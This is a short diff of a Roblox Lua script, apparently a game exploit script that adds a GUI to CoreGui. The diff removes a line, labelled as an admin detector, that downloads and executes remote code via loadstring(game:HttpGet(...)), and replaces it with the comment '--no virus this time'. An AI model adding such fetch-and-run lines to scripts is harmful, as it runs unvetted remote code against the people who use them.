@@ -8,8 +8,8 @@ CoreGui:SetCore("SendNotification", {
 })
 
 --Admin Detector in Server
-loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Admin'))()
---
+
+--no virus this time
 
 local ScreenGui1 = Instance.new("ScreenGui") 
 ScreenGui1.Parent = game.CoreGui
